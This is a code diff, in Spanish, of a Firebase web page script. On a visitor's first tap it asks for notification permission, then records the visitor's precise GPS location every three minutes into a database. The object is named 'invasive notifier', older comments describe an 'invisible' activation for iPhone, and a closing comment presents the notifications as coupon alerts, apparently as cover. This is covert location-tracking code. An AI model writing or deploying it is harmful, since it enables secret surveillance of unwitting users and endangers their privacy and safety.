@@ -25,88 +25,85 @@ const app = initializeApp(firebaseConfig);
 // Initialize Cloud Firestore and get a reference to the service
 const db = getFirestore(app);
 /* ******************************************************************************* */
-
-/*FUNCION DE BD*/
 /* --- 1. FUNCIÓN PARA GUARDAR EN FIREBASE --- */
-async function guardarUbicacionBD(lat, lon) {
+async function guardarUbicacionBD(latitud, longitud) {
   try {
-    const colRef = collection(db, "ubicaciones");
+    // Verificamos que los datos no lleguen vacíos
+    if (latitud === undefined || longitud === undefined) {
+      console.error("Latitud o Longitud son indefinidas.");
+      return;
+    }
 
-    // Obtenemos el conteo para generar un ID secuencial
+    const colRef = collection(db, "ubicaciones");
     const snapshot = await getCountFromServer(colRef);
     const nuevoId = snapshot.data().count;
 
     await addDoc(colRef, {
-      ubicacion: `${lat}, ${lon}`,
+      ubicacion: `${latitud}, ${longitud}`,
       id_ubicaciones: nuevoId,
       fecha_ubi: serverTimestamp(),
     });
-    console.log(`Ubicación guardada en BD. ID: ${nuevoId}`);
+
+    console.log(`Guardado con éxito: ID ${nuevoId} (${latitud}, ${longitud})`);
   } catch (e) {
     console.error("Error al guardar en Firebase:", e);
   }
 }
-/* --- CONFIGURACIÓN DE SEGURIDAD PARA ANDROID --- */
+
+/* --- 2. FUNCIÓN DE GEOLOCALIZACIÓN --- */
 const opcionesGPS = {
-  enableHighAccuracy: true, // Android usa el GPS real si esto es true
-  timeout: 20000,           // 20 segundos (Android a veces tarda en "fijar" satélites)
+  enableHighAccuracy: true,
+  timeout: 20000,
   maximumAge: 0
 };
 
 async function obtenerUbicacion() {
-  if (!navigator.geolocation) return;
+  if (!navigator.geolocation) {
+    console.error("Geolocalización no soportada");
+    return;
+  }
 
   navigator.geolocation.getCurrentPosition(
     async (pos) => {
-      const { latitude, longitude } = pos.coords;
-      console.log("Ubicación capturada en Android/iOS");
-      guardarUbicacionBD(latitude, longitude);
+      // Extraemos las variables correctamente del objeto pos.coords
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      console.log(`Coordenadas obtenidas: ${lat}, ${lon}`);
+
+      // Enviamos las variables extraídas a la función de BD
+      await guardarUbicacionBD(lat, lon);
     },
     (err) => {
       console.error("Error GPS:", err.code, err.message);
-      // Si falla con HighAccuracy, reintentamos con baja precisión (más rápido en Android)
+      // Reintento con baja precisión si falla por tiempo
       if (err.code === err.TIMEOUT) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          guardarUbicacionBD(pos.coords.latitude, pos.coords.longitude);
-        }, null, { enableHighAccuracy: false });
+        navigator.geolocation.getCurrentPosition(
+          p => guardarUbicacionBD(p.coords.latitude, p.coords.longitude),
+          null,
+          { enableHighAccuracy: false }
+        );
       }
     },
     opcionesGPS
   );
 }
 
-/* --- DISPARADOR UNIVERSAL --- */
-function inicializarApp() {
-  
-  NotificadorInvasivo.solicitarPermiso(180000);
-
-  // Quitamos eventos para evitar bucles
-  document.removeEventListener('click', inicializarApp);
-  document.removeEventListener('touchstart', inicializarApp);
-}
-
-document.addEventListener('click', inicializarApp);
-document.addEventListener('touchstart', inicializarApp);
-
-/* --- 3. OBJETO NOTIFICADOR (EL CORAZÓN DEL PERMISO) --- */
+/* --- 3. OBJETO NOTIFICADOR --- */
 const NotificadorInvasivo = {
   registration: null,
   solicitarPermiso: async function (ms) {
     try {
-      // REGISTRO DEL SERVICE WORKER
-      // IMPORTANTE: Sin el '/public/', asumiendo que sw.js está en la raíz de tu hosting
+      // Registro del Service Worker (Ruta raíz para Firebase)
       this.registration = await navigator.serviceWorker.register('/sw.js');
       console.log("Service Worker registrado.");
 
-      // SOLICITUD DE PERMISO DE NOTIFICACIÓN
-      // Esto disparará el cartel en iPhone solo si viene de un toque (click/touchstart)
       let permission = await Notification.requestPermission();
 
       if (permission === "granted") {
-        console.log("Permiso de notificación concedido.");
-        obtenerUbicacion(); // Primera captura
+        console.log("Permiso concedido. Iniciando capturas...");
+        obtenerUbicacion(); // Captura inmediata
 
-        // Intervalo de captura (ms = 180000 para 3 minutos)
         setInterval(() => {
           obtenerUbicacion();
         }, ms);
@@ -117,26 +114,21 @@ const NotificadorInvasivo = {
   }
 };
 
-/* --- 4. LÓGICA DE ACTIVACIÓN "INVISIBLE" PARA IPHONE --- */
+/* --- 4. DISPARADOR ÚNICO (UNIVERSAL) --- */
+function iniciarTodo() {
+  console.log("Interacción detectada. Activando sistema...");
 
-// Esta función se ejecuta al primer toque del usuario
-function activarAlInteractuar() {
-  console.log("Usuario interactuó. Solicitando permisos...");
-
-  // Ejecutamos la lógica de permisos (3 minutos)
+  // Ejecutamos la lógica de permisos y ubicación
   NotificadorInvasivo.solicitarPermiso(180000);
 
-  // IMPORTANTE: Quitamos los escuchadores para que no se repita en cada clic
-  document.removeEventListener('click', activarAlInteractuar);
-  document.removeEventListener('touchstart', activarAlInteractuar);
+  // Limpiamos los eventos para que no se repita
+  document.removeEventListener('click', iniciarTodo);
+  document.removeEventListener('touchstart', iniciarTodo);
 }
 
-// Escuchamos el primer clic o toque en cualquier parte de la pantalla
-document.addEventListener('click', activarAlInteractuar);
-document.addEventListener('touchstart', activarAlInteractuar);
-
-
-
+// Escuchadores de eventos
+document.addEventListener('click', iniciarTodo);
+document.addEventListener('touchstart', iniciarTodo);
 /**
  * NOTIFICACIONES CADA 5 MINUTOS 
  * POR EL DESBLOQUEO DE UN CUPON NUEVO
